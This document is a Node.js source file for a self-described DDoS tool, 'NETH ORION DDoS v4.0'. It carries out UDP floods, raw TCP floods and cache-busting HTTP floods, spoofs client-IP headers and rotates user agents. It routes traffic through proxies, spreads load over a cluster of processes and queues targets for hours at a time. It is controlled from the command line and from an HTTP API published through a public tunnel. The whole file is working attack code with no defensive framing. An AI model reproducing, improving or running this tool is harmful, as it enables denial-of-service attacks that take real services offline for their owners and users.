const express = require("express");
const fs = require("fs");
const path = require("path");
const http = require("http");
const https = require("https");
const net = require("net");
const dgram = require("dgram");
const cluster = require("cluster");
const os = require("os");
const { randomUserAgent } = require("random-headers");
const { SocksProxyAgent } = require("socks-proxy-agent");
const { request: urequest, ProxyAgent } = require("undici");
const readline = require("readline");
require("dotenv").config();

const nport = require("./nport.js");

const USE_CLUSTER = process.env.USE_CLUSTER === "true";

// ===================== SHARED CONFIG =====================
const REQUESTS_PER_CYCLE = parseInt(process.env.PER_THREAD, 10) || 3;
const numThreads = parseInt(process.env.MAX_THREADS, 10) || 1000;
const MAX_QUEUE = parseInt(process.env.MAX_QUEUE, 10) || 20;
const USE_UDP = process.env.UDP_FLOOD !== "false";
const USE_RAW_TCP = process.env.RAW_TCP !== "false";
const KEEP_ALIVE = process.env.KEEP_ALIVE !== "false";

const colors = {
  red: (t) => `\x1b[31m${t}\x1b[0m`,
  green: (t) => `\x1b[32m${t}\x1b[0m`,
  yellow: (t) => `\x1b[33m${t}\x1b[0m`,
  cyan: (t) => `\x1b[36m${t}\x1b[0m`,
  magenta: (t) => `\x1b[35m${t}\x1b[0m`,
  gray: (t) => `\x1b[90m${t}\x1b[0m`,
  bold: (t) => `\x1b[1m${t}\x1b[0m`,
};

const generateCacheBuster = () => `${Date.now()}_${Math.random().toString(36).slice(2, 6)}`;
const formatNumber = (num) => num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");

const proxyFilePath = path.join(__dirname, "proxy.txt");
const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];

function loadProxies() {
  try {
    return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map(l => l.trim()).filter(Boolean);
  } catch {
    return [];
  }
}

const getNoCacheHeaders = () => ({
  "Cache-Control": "no-cache, no-store, max-age=0",
  Pragma: "no-cache",
  "User-Agent": randomUserAgent(),
  "Accept": "*/*",
  "Accept-Encoding": "gzip, deflate, br",
  "Accept-Language": "en-US,en;q=0.9",
  "Connection": KEEP_ALIVE ? "keep-alive" : "close",
  "X-Forwarded-For": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
  "CF-Connecting-IP": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
  "True-Client-IP": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
});

const httpAgent = KEEP_ALIVE ? new http.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity, maxFreeSockets: 256 }) : null;
const httpsAgent = KEEP_ALIVE ? new https.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity, maxFreeSockets: 256, rejectUnauthorized: false }) : null;

// ===================== ATTACK FUNCTIONS =====================

function udpFlood(targetIP, port, threadId) {
  const socket = dgram.createSocket("udp4");
  const payload = Buffer.alloc(1400, "A");
  let sent = 0;
  const flood = () => {
    if (!continueAttack) { socket.close(); return; }
    for (let i = 0; i < 10; i++) {
      socket.send(payload, 0, payload.length, port, targetIP, (err) => {
        if (!err) sent++;
      });
    }
    setImmediate(flood);
  };
  setImmediate(flood);
  return () => sent;
}

function rawTCPFlood(host, port, threadId) {
  let sent = 0;
  const flood = () => {
    if (!continueAttack) return;
    for (let i = 0; i < 5; i++) {
      const socket = new net.Socket();
      socket.connect(port, host, () => {
        socket.write(`GET /${generateCacheBuster()} HTTP/1.1\r\nHost: ${host}\r\n\r\n`);
        sent++;
        socket.destroy();
      });
      socket.on("error", () => {});
    }
    setImmediate(flood);
  };
  setImmediate(flood);
  return () => sent;
}

function socksRequest(url, agent) {
  return new Promise((resolve) => {
    const req = https.request(url, { agent, method: "GET", headers: getNoCacheHeaders(), timeout: 1000, rejectUnauthorized: false }, (res) => {
      res.resume();
      resolve({ status: res.statusCode });
    });
    req.on("error", () => resolve(null));
    req.on("timeout", () => { req.destroy(); resolve(null); });
    req.end();
  });
}

function createContext(proxyLine) {
  if (!proxyLine) return { type: "direct" };
  const parts = proxyLine.split(":");
  if (parts[0].includes("socks")) {
    const host = parts[0].replace("socks5://", "").replace("socks4://", "");
    return { type: "socks", agent: new SocksProxyAgent(`socks5://${host}:${parts[1]}`) };
  }
  return { type: "http", dispatcher: new ProxyAgent(`http://${proxyLine}`) };
}

const fireHTTPRequest = (url, ctx) => {
  return new Promise((resolve) => {
    const parsedUrl = new URL(url);
    const options = {
      hostname: parsedUrl.hostname,
      port: parsedUrl.port || (parsedUrl.protocol === "https:" ? 443 : 80),
      path: parsedUrl.pathname + parsedUrl.search,
      method: "GET",
      headers: getNoCacheHeaders(),
      agent: parsedUrl.protocol === "https:" ? httpsAgent : httpAgent,
      timeout: 2000,
      rejectUnauthorized: false,
    };
    const req = (parsedUrl.protocol === "https:" ? https : http).request(options, (res) => {
      res.resume();
      resolve({ status: res.statusCode });
    });
    req.on("error", () => resolve(null));
    req.on("timeout", () => { req.destroy(); resolve(null); });
    req.end();
  });
};

// ===================== WORKER PROCESS =====================
// Attack engine only — no CLI, no Express, no readline

if (USE_CLUSTER && cluster.isWorker) {
  let continueAttack = false;
  let currentTarget = null;

  const performAttack = async (target, ctx, threadId, isDirect) => {
    if (!continueAttack || !target) return;

    const endTime = target.startTime + target.duration;
    if (Date.now() > endTime) {
      if (process.connected) process.send({ type: "targetComplete" });
      return;
    }

    if (USE_UDP) {
      const parsed = new URL(target.url);
      udpFlood(parsed.hostname, parsed.port || 80, threadId);
      return;
    }

    if (USE_RAW_TCP) {
      const parsed = new URL(target.url);
      rawTCPFlood(parsed.hostname, parsed.port || 80, threadId);
      return;
    }

    const promises = [];
    for (let i = 0; i < REQUESTS_PER_CYCLE; i++) {
      const cb = generateCacheBuster();
      const sep = target.url.includes("?") ? "&" : "?";
      const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}`;
      if (ctx.type === "socks") {
        promises.push(socksRequest(url, ctx.agent));
      } else if (ctx.type === "http") {
        promises.push(
          urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(2000) })
            .then(async (res) => { await res.body.dump(); return { status: res.statusCode }; })
            .catch(() => null)
        );
      } else {
        promises.push(fireHTTPRequest(url, ctx));
      }
    }

    let successfulRequests = 0;
    try {
      const results = await Promise.allSettled(promises);
      for (const r of results) {
        if (r.status === "fulfilled" && r.value && r.value.status) successfulRequests++;
      }
    } catch {}

    if (process.connected) {
      process.send({ type: "report", count: successfulRequests, threadId });
    }

    if (continueAttack) {
      setTimeout(() => performAttack(target, ctx, threadId, isDirect), 10);
    }
  };

  process.on("message", (msg) => {
    if (msg.type === "start") {
      continueAttack = true;
      currentTarget = msg.target;
      const proxies = loadProxies();
      const halfThreads = Math.ceil(msg.threadsForMe / 2);

      for (let i = 0; i < msg.threadsForMe; i++) {
        if (!continueAttack) break;
        if (i < halfThreads || !proxies.length) {
          performAttack(currentTarget, { type: "direct" }, i, true);
        } else {
          performAttack(currentTarget, createContext(getRandomElement(proxies)), i, false);
        }
      }
    } else if (msg.type === "stop") {
      continueAttack = false;
    }
  });

  // Keep worker alive
  setInterval(() => {}, 60000);
  module.exports = {};
  return;
}

// ===================== MASTER / SINGLE-PROCESS =====================

// Shared state
const stateFilePath = path.join(__dirname, "attackState.json");
let continueAttack = false;
let currentTarget = null;
let totalRequestsSent = 0;
let targetQueue = [];
let activeThreads = [];
let lastStatusLog = 0;
let nportUrl = null;
let tunnelActive = false;
let saveTimer = null;
let statusInterval = null;
let totalReqCount = 0;

// Cluster master forks workers
if (USE_CLUSTER && cluster.isMaster) {
  const numWorkers = os.cpus().length;
  console.log(colors.cyan(`Forking ${numWorkers} attack workers...`));
  for (let i = 0; i < numWorkers; i++) cluster.fork();
  cluster.on("exit", (worker) => { cluster.fork(); });

  // Aggregate worker reports
  cluster.on("message", (worker, msg) => {
    if (msg.type === "report") {
      totalReqCount += msg.count;
    } else if (msg.type === "targetComplete") {
      handleTargetComplete();
    }
  });
}

// ===================== STATE MANAGEMENT =====================

function ensureStateFileExists() {
  if (!fs.existsSync(stateFilePath)) {
    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] }));
  }
}

function loadState() {
  ensureStateFileExists();
  try {
    return JSON.parse(fs.readFileSync(stateFilePath, "utf-8"));
  } catch {
    return { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
  }
}

let state = loadState();
continueAttack = state.continueAttack;
currentTarget = state.currentTarget;
totalRequestsSent = state.totalRequests || 0;
targetQueue = state.queue || [];

if (currentTarget) {
  const endTime = currentTarget.startTime + currentTarget.duration;
  if (Date.now() > endTime) {
    console.log(colors.yellow(`Target expired: ${currentTarget.url}`));
    currentTarget = null;
  }
}
if (!currentTarget && targetQueue.length > 0) {
  currentTarget = targetQueue.shift();
  console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
  totalRequestsSent = 0;
}
if (currentTarget === null) {
  continueAttack = false;
  totalRequestsSent = 0;
}
state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
fs.writeFileSync(stateFilePath, JSON.stringify(state));

function debouncedSave() {
  if (saveTimer) return;
  saveTimer = setTimeout(() => {
    state.totalRequests = totalRequestsSent + totalReqCount;
    fs.writeFile(stateFilePath, JSON.stringify(state), () => {});
    saveTimer = null;
  }, 500);
}

function saveNow() {
  if (saveTimer) { clearTimeout(saveTimer); saveTimer = null; }
  totalRequestsSent += totalReqCount;
  totalReqCount = 0;
  state.totalRequests = totalRequestsSent;
  fs.writeFileSync(stateFilePath, JSON.stringify(state));
}

function resetTotal() {
  totalRequestsSent = 0;
  totalReqCount = 0;
  state.totalRequests = 0;
  fs.writeFileSync(stateFilePath, JSON.stringify(state));
  console.log(colors.green("Total reset to 0"));
}

// ===================== COMMAND / UI FUNCTIONS =====================

function startStatusDisplay() {
  if (statusInterval) clearInterval(statusInterval);
  statusInterval = setInterval(() => {
    const count = totalReqCount;
    totalRequestsSent += count;
    totalReqCount = 0;
    if (count > 0 || lastStatusLog > 0) {
      console.log(`${colors.green(">")} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(count)} req/s`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.magenta(`Workers: ${Object.keys(cluster.workers || {}).length || 1}`)}`);
      debouncedSave();
    }
    lastStatusLog = Date.now();
  }, 1000);
}

function stopStatusDisplay() {
  if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
}

function handleTargetComplete() {
  if (targetQueue.length > 0) {
    currentTarget = targetQueue.shift();
    console.log(colors.green(`Target completed — starting next: ${currentTarget.url}`));
    resetTotal();
    state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
    saveNow();
    broadcastToWorkers({ type: "start", target: currentTarget, threadsForMe: Math.ceil(numThreads / (Object.keys(cluster.workers || {}).length || 1)) });
  } else {
    continueAttack = false;
    currentTarget = null;
    resetTotal();
    state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
    saveNow();
    stopStatusDisplay();
    console.log(colors.yellow("All targets completed. Attack finished."));
    broadcastToWorkers({ type: "stop" });
  }
}

function broadcastToWorkers(msg) {
  if (USE_CLUSTER && cluster.isMaster && cluster.workers) {
    for (const id in cluster.workers) {
      try { cluster.workers[id].send(msg); } catch {}
    }
  }
}

const addToQueue = async (url, durationHours) => {
  if (!url || !/^https?:\/\//.test(url)) { console.log(colors.red("Invalid URL")); return false; }
  if (targetQueue.length >= MAX_QUEUE) { console.log(colors.red(`Queue is full. Max queue size: ${MAX_QUEUE}`)); return false; }
  const newTarget = { url, startTime: Date.now(), duration: durationHours * 60 * 60 * 1000 };
  targetQueue.push(newTarget);
  state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
  saveNow();
  console.log(colors.green(`Added to queue: ${url} for ${durationHours}h (${targetQueue.length}/${MAX_QUEUE})`));
  return true;
};

const startAttack = async (url, durationHours) => {
  if (!url || !/^https?:\/\//.test(url)) { console.log(colors.red("Invalid URL")); return false; }
  if (continueAttack) { console.log(colors.yellow("Attack already running, adding to queue instead")); return await addToQueue(url, durationHours); }

  resetTotal();
  targetQueue = [];

  currentTarget = { url, startTime: Date.now(), duration: durationHours * 60 * 60 * 1000 };
  continueAttack = true;
  state = { continueAttack, currentTarget, totalRequests: 0, queue: [] };
  saveNow();

  const proxies = loadProxies();
  const directCount = proxies.length ? Math.floor(numThreads / 2) : numThreads;
  const proxyCount = proxies.length ? numThreads - directCount : 0;

  console.log(colors.green(`\nAttack Started: ${url} for ${durationHours}h`));
  console.log(colors.cyan(`Threads: ${numThreads} | Req/cycle: ${REQUESTS_PER_CYCLE}`));
  if (USE_CLUSTER && cluster.isMaster) {
    console.log(colors.magenta(`Workers: ${Object.keys(cluster.workers).length} | Distributed mode`));
  }
  console.log(colors.magenta(`Direct: ${directCount} threads | Proxy: ${proxyCount} threads`));
  if (USE_UDP) console.log(colors.red("UDP FLOOD MODE ENABLED"));
  if (USE_RAW_TCP) console.log(colors.red("RAW TCP MODE ENABLED"));
  if (KEEP_ALIVE) console.log(colors.cyan("Keep-Alive: ON"));
  if (tunnelActive && nportUrl) console.log(colors.magenta(`Public: ${nportUrl}`));
  console.log("");

  if (USE_CLUSTER && cluster.isMaster) {
    const numWorkers = Object.keys(cluster.workers).length;
    const threadsPerWorker = Math.ceil(numThreads / numWorkers);
    totalReqCount = 0;
    for (const id in cluster.workers) {
      cluster.workers[id].send({ type: "start", target: currentTarget, threadsForMe: threadsPerWorker });
    }
    startStatusDisplay();
  } else {
    // Single-process mode: launch threads directly
    activeThreads = [];
    let threadId = 0;
    if (!proxies.length) {
      for (let i = 0; i < numThreads; i++) {
        if (!continueAttack) break;
        performAttackSingle(currentTarget, { type: "direct" }, threadId++, true);
        activeThreads.push(i);
      }
    } else {
      for (let i = 0; i < directCount; i++) {
        if (!continueAttack) break;
        performAttackSingle(currentTarget, { type: "direct" }, threadId++, true);
        activeThreads.push(i);
      }
      for (let i = 0; i < proxyCount; i++) {
        if (!continueAttack) break;
        performAttackSingle(currentTarget, createContext(getRandomElement(proxies)), threadId++, false);
        activeThreads.push(i + directCount);
      }
    }
  }
  return true;
};

// Single-process attack function (identical to original)
const performAttackSingle = async (target, ctx, threadId, isDirect) => {
  if (!continueAttack || !target) return;

  const endTime = target.startTime + target.duration;
  if (Date.now() > endTime) {
    console.log(colors.yellow(`Target completed: ${target.url}`));
    if (targetQueue.length > 0) {
      currentTarget = targetQueue.shift();
      console.log(colors.green(`Starting next target from queue: ${currentTarget.url}`));
      resetTotal();
      state = { continueAttack, currentTarget, totalRequests: totalRequestsSent, queue: targetQueue };
      saveNow();
    } else {
      continueAttack = false;
      currentTarget = null;
      resetTotal();
      state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
      saveNow();
      console.log(colors.yellow("All targets completed. Attack finished."));
    }
    return;
  }

  if (USE_UDP) {
    const parsed = new URL(target.url);
    udpFlood(parsed.hostname, parsed.port || 80, threadId);
    return;
  }
  if (USE_RAW_TCP) {
    const parsed = new URL(target.url);
    rawTCPFlood(parsed.hostname, parsed.port || 80, threadId);
    return;
  }

  const startTime = Date.now();
  const promises = [];
  for (let i = 0; i < REQUESTS_PER_CYCLE; i++) {
    const cb = generateCacheBuster();
    const sep = target.url.includes("?") ? "&" : "?";
    const url = `${target.url}${sep}_=${cb}&nocache=${cb}&cb=${Date.now()}&r=${Math.random()}`;
    if (ctx.type === "socks") {
      promises.push(socksRequest(url, ctx.agent));
    } else if (ctx.type === "http") {
      promises.push(
        urequest(url, { dispatcher: ctx.dispatcher, method: "GET", headers: getNoCacheHeaders(), signal: AbortSignal.timeout(2000) })
          .then(async (res) => { await res.body.dump(); return { status: res.statusCode }; })
          .catch(() => null)
      );
    } else {
      promises.push(fireHTTPRequest(url, ctx));
    }
  }

  let successfulRequests = 0;
  try {
    const results = await Promise.allSettled(promises);
    for (const r of results) {
      if (r.status === "fulfilled" && r.value && r.value.status) successfulRequests++;
    }
  } catch {}

  totalRequestsSent += successfulRequests;
  debouncedSave();

  const duration = Date.now() - startTime;
  if (threadId === 0 && duration > 0) {
    const now = Date.now();
    if (now - lastStatusLog > 1000) {
      lastStatusLog = now;
      const rps = (successfulRequests / (duration / 1000)).toFixed(1);
      console.log(`${colors.green(">")} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(successfulRequests)} req`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.green(`RPS: ${rps}`)} | ${colors.magenta(`Threads: ${activeThreads.length}`)}`);
    }
  }

  if (continueAttack) {
    setTimeout(() => performAttackSingle(target, ctx, threadId, isDirect), 10);
  }
};

const stopAttack = async () => {
  if (!continueAttack) { console.log(colors.yellow("No active attack")); return; }
  continueAttack = false;
  stopStatusDisplay();
  broadcastToWorkers({ type: "stop" });
  activeThreads = [];
  currentTarget = null;
  targetQueue = [];
  resetTotal();
  state = { continueAttack: false, currentTarget: null, totalRequests: 0, queue: [] };
  saveNow();
  console.log(colors.yellow("\nAttack Stopped"));
  console.log(colors.green("Queue cleared. Total reset to 0\n"));
};

const resumeAttack = async () => {
  if (!continueAttack || !currentTarget) return;
  console.log(colors.yellow(`Resuming attack on: ${currentTarget.url}`));
  console.log(colors.cyan(`Queue length: ${targetQueue.length}/${MAX_QUEUE}`));

  if (USE_CLUSTER && cluster.isMaster) {
    const numWorkers = Object.keys(cluster.workers).length;
    const threadsPerWorker = Math.ceil(numThreads / numWorkers);
    for (const id in cluster.workers) {
      cluster.workers[id].send({ type: "start", target: currentTarget, threadsForMe: threadsPerWorker });
    }
    startStatusDisplay();
    console.log(colors.green(`Resumed with ${numWorkers} workers (${threadsPerWorker} threads each)`));
    return;
  }

  const proxies = loadProxies();
  activeThreads = [];
  let threadId = 0;

  if (!proxies.length) {
    for (let i = 0; i < numThreads; i++) {
      if (!continueAttack) break;
      performAttackSingle(currentTarget, { type: "direct" }, threadId++, true);
      activeThreads.push(i);
    }
    console.log(colors.green(`Resumed with ${activeThreads.length} threads (direct)`));
  } else {
    const halfThreads = Math.floor(numThreads / 2);
    for (let i = 0; i < halfThreads; i++) {
      if (!continueAttack) break;
      performAttackSingle(currentTarget, { type: "direct" }, threadId++, true);
      activeThreads.push(i);
    }
    for (let i = 0; i < numThreads - halfThreads; i++) {
      if (!continueAttack) break;
      performAttackSingle(currentTarget, createContext(getRandomElement(proxies)), threadId++, false);
      activeThreads.push(i + halfThreads);
    }
    console.log(colors.green(`Resumed with ${activeThreads.length} threads (${halfThreads} direct + ${numThreads - halfThreads} proxy)`));
  }
};

const autoStartTunnel = async () => {
  const tunnelSubdomain = process.env.NPORT || "ddos";
  console.log(colors.cyan(`Starting tunnel: ${tunnelSubdomain}`));
  try {
    const url = await nport.start(25694, tunnelSubdomain, { disableSuffix: false });
    if (url) { nportUrl = url; tunnelActive = true; console.log(colors.green(`Tunnel active: ${nportUrl}`)); return true; }
    console.log(colors.red("Tunnel failed"));
    return false;
  } catch (err) {
    console.log(colors.red(`Tunnel error: ${err.message}`));
    return false;
  }
};

const showStatus = () => {
  if (!continueAttack || !currentTarget) { console.log(colors.yellow("No active attack")); return; }
  const remaining = ((currentTarget.startTime + currentTarget.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
  console.log(colors.cyan("\n=== ATTACK STATUS ==="));
  console.log(`${colors.yellow("Current Target:")} ${currentTarget.url}`);
  console.log(`${colors.gray(`Remaining: ${remaining}h`)}`);
  console.log(`${colors.green("Requests Sent:")} ${formatNumber(totalRequestsSent + totalReqCount)}`);
  if (USE_CLUSTER && cluster.isMaster) {
    console.log(`${colors.cyan("Workers:")} ${Object.keys(cluster.workers).length}`);
  } else {
    console.log(`${colors.cyan("Active Threads:")} ${activeThreads.length}`);
  }
  console.log(`${colors.magenta("Queue:")} ${targetQueue.length}/${MAX_QUEUE}`);
  if (targetQueue.length > 0) {
    console.log(`${colors.yellow("\nQueued Targets:")}`);
    targetQueue.forEach((t, idx) => {
      const qr = ((t.startTime + t.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
      console.log(`  ${idx + 1}. ${t.url} (${qr}h)`);
    });
  }
  if (tunnelActive && nportUrl) console.log(`${colors.magenta("\nPublic URL:")} ${nportUrl}`);
  console.log("");
};

const showHelp = () => {
  console.log(colors.cyan("\n=== NETH ORION DDoS v4.0 ==="));
  console.log(`${colors.green("start <url> [hours]")}        - Start multi-threaded attack`);
  console.log(`${colors.green("add <url> [hours]")}          - Add to queue`);
  console.log(`${colors.green("stop")}                       - Stop attack`);
  console.log(`${colors.green("status")}                     - Show status`);
  console.log(`${colors.green("queue")}                      - Show queue only`);
  console.log(`${colors.green("clear")}                      - Clear console`);
  console.log(`${colors.green("help")}                       - This help`);
  console.log(`${colors.green("exit")}                       - Exit\n`);
  const mode = USE_CLUSTER && cluster.isMaster ? `Cluster (${Object.keys(cluster.workers).length} workers)` : "Single-process";
  console.log(colors.gray(`Threads: ${numThreads} | Cycle: ${REQUESTS_PER_CYCLE} | Mode: ${mode}`));
  console.log(colors.gray(`UDP Mode: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP}`));
};

const showQueue = () => {
  if (targetQueue.length === 0) { console.log(colors.yellow("\nQueue is empty")); }
  else {
    console.log(colors.cyan("\n=== QUEUE ==="));
    targetQueue.forEach((t, idx) => {
      const r = ((t.startTime + t.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
      console.log(`${idx + 1}. ${t.url} (${r}h left in queue)`);
    });
  }
  console.log(`\n${colors.magenta(`${targetQueue.length}/${MAX_QUEUE} slots used`)}`);
};

const clearConsole = () => {
  console.clear();
  console.log(colors.green("NETH ORION DDoS v4.0"));
  const mode = USE_CLUSTER && cluster.isMaster ? `Cluster (${Object.keys(cluster.workers).length} workers)` : "Single-process";
  console.log(colors.gray(`Mode: ${mode} | Keep-Alive: ${KEEP_ALIVE} | UDP: ${USE_UDP} | RAW: ${USE_RAW_TCP}`));
  console.log(colors.gray('Type "help" for commands\n'));
};

const handleCommand = async (cmd) => {
  const parts = cmd.trim().split(/\s+/);
  const command = parts[0].toLowerCase();
  const args = parts.slice(1);
  switch (command) {
    case "start":
      if (args.length < 1) { console.log(colors.red("Usage: start <url> [hours]")); return; }
      await startAttack(args[0], args[1] ? parseFloat(args[1]) : 1);
      break;
    case "add":
      if (args.length < 1) { console.log(colors.red("Usage: add <url> [hours]")); return; }
      await addToQueue(args[0], args[1] ? parseFloat(args[1]) : 1);
      break;
    case "queue": showQueue(); break;
    case "stop": await stopAttack(); break;
    case "status": showStatus(); break;
    case "clear": clearConsole(); break;
    case "help": showHelp(); break;
    case "exit": console.log(colors.yellow("Goodbye!")); process.exit(0); break;
    default:
      if (command) console.log(colors.red(`Unknown: ${command}`));
      showHelp();
  }
};

// ===================== EXPRESS ROUTES =====================

const app = express();
app.use(express.json());

app.get("/stresser", async (req, res) => {
  const url = req.query.url;
  const duration = parseFloat(req.query.duration) || 1;
  if (!url || !/^https?:\/\//.test(url)) return res.status(400).json({ error: "Invalid URL" });
  await startAttack(url, duration);
  res.json({ success: true, message: `Attack started on ${url}` });
});

app.get("/add", async (req, res) => {
  const url = req.query.url;
  const duration = parseFloat(req.query.duration) || 1;
  if (!url || !/^https?:\/\//.test(url)) return res.status(400).json({ error: "Invalid URL" });
  const success = await addToQueue(url, duration);
  res.json({ success, currentQueue: targetQueue.length });
});

app.get("/stop", async (req, res) => {
  await stopAttack();
  res.json({ success: true, totalRequests: totalRequestsSent });
});

app.get("/status", (req, res) => {
  res.json({
    active: continueAttack,
    currentTarget: currentTarget ? currentTarget.url : null,
    totalRequests: totalRequestsSent + totalReqCount,
    threads: USE_CLUSTER && cluster.isMaster ? Object.keys(cluster.workers).length : activeThreads.length,
    queueCount: targetQueue.length,
    clusterMode: USE_CLUSTER && cluster.isMaster,
  });
});

// ===================== STARTUP =====================

const port = process.env.PORT || 25694;

(async () => {
  await autoStartTunnel();
  app.listen(port, () => {
    console.clear();
    const mode = USE_CLUSTER && cluster.isMaster ? `CLUSTER (${Object.keys(cluster.workers).length} workers)` : "SINGLE PROCESS";
    console.log(colors.green(`\nNETH ORION DDoS v4.0`));
    console.log(colors.cyan(`Local API: http://localhost:${port}`));
    console.log(colors.magenta(`Mode: ${mode} | Threads: ${numThreads} | Keep-Alive: ${KEEP_ALIVE}`));
    console.log(colors.red(`UDP Flood: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP}`));
    if (tunnelActive && nportUrl) console.log(colors.magenta(`Public API: ${nportUrl}`));
    console.log(colors.green('\nType "help" for commands\n'));

    resumeAttack();

    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.setPrompt(colors.red("neth-orion> "));
    rl.prompt();
    rl.on("line", async (input) => {
      await handleCommand(input);
      rl.prompt();
    });
  });
})();
